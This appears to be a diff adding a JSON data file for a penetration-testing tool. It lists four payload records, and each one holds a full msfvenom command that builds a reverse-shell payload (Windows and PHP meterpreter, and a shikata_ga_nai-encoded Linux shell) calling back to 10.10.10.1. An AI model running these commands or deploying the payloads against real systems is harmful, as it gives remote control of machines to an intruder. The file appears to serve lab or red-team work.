@@ -1,0 +1,54 @@
+[
+  {
+    "id": 1,
+    "name": "Meterpreter Reverse TCP",
+    "type": "meterpreter",
+    "target_id": 1,
+    "format": "raw",
+    "lhost": "10.10.10.1",
+    "lport": 4444,
+    "encoder": "none",
+    "status": "ready",
+    "createdAt": "2026-10-17T09:15:00Z",
+    "encoded": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f raw"
+  },
+  {
+    "id": 2,
+    "name": "Linux Shell Reverse",
+    "type": "shellcode",
+    "target_id": 1,
+    "format": "c",
+    "lhost": "10.10.10.1",
+    "lport": 8080,
+    "encoder": "shikata_ga_nai",
+    "status": "generated",
+    "createdAt": "2026-10-17T09:30:00Z",
+    "encoded": "msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.1 LPORT=8080 -e x86/shikata_ga_nai -f c"
+  },
+  {
+    "id": 3,
+    "name": "PHP Web Shell",
+    "type": "webshell",
+    "target_id": 2,
+    "format": "php",
+    "lhost": "10.10.10.1",
+    "lport": 4444,
+    "encoder": "none",
+    "status": "ready",
+    "createdAt": "2026-10-17T08:45:00Z",
+    "encoded": "msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f raw"
+  },
+  {
+    "name": "Test Shell Payload",
+    "type": "meterpreter",
+    "target_id": null,
+    "format": "raw",
+    "lhost": "10.10.10.1",
+    "lport": "4444",
+    "encoder": "none",
+    "status": "generated",
+    "createdAt": "2026-10-17T12:25:48.783Z",
+    "encoded": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f raw",
+    "id": 21
+  }
+]
